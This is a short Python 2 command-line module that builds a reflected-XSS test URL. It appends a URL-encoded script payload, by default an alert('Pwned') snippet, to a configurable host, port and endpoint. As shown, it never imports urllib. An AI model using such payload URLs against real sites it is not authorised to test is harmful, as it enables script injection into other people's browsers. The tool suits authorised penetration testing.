"""
Generate XSS injection payloads.
"""

def set_cli_opts(parser):
    """
    TODO: DOC
    """
    parser.set_defaults(func=entry)

    parser.add_argument(
        "payload",
        default="""
        <script>
        alert('Pwned');
        </script>
        """,
        help="""
        The payload to encode. The default is: %(default)s
        """
    )

    parser.add_argument(
        "--host",
        default="localhost",
        help="""
        Set the host that should be used in the generated payload. Default is
        %(default)s.
        """
    )
    parser.add_argument(
        "--port",
        default=3000,
        help="""
        Set the port that should be used in the generated payload. Default is
        %(default)s.
        """
    )
    parser.add_argument(
        "--endpoint",
        default="/",
        help="""
        Set the endpoint that should be used in the generated payload. Default
        is %(default)s.
        """
    )
    parser.add_argument(
        "--https",
        default=False,
        action="store_true",
        help="""
        Use HTTPS for the generated payload.
        """
    )

def entry(args):
    """
    The entry point for this command.
    """
    print "{protocol}://{host}:{port}{endpoint}{payload}".format(
        protocol="https" if args.https else "http",
        host=args.host,
        port=str(args.port),
        endpoint=args.endpoint,
        payload=urllib.quote(args.payload)
    )
